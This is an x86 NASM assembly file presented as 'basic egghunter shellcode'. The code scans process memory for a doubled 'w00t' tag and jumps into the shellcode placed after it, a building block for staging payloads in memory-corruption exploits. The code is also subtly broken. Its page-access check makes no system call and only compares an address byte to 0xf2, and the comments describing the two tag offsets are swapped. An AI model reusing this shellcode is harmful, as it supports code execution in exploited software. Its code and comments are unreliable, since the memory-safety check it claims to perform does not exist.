; Filename: egghunter.nasm
; Author:  Lucas Kauffman
; Purpose: Basic eggunter shellcode
;
global _start

section .text


_start:
        pop eax ; pop a random value into eax (whatever is on the stack)

_noEggs:
        inc eax
        cmp al, 0xf2 ; check if we can access the memory page or not.
        jz _noEggs ; if we can't access it, jump further
        cmp dword[eax-8], egg ; check if the 4-1 bytes preceding eax are containing w00t
        jne _noEggs
        cmp dword[eax-4], egg ; check if the 8-5 bytes preceding eax are containing w00t too.
        jne _noEggs
        jmp eax ; down the rabbit hole, jump to the shellcode and execute it.

section .data

        egg equ "w00t" ; Keyword which is 4 bytes long.

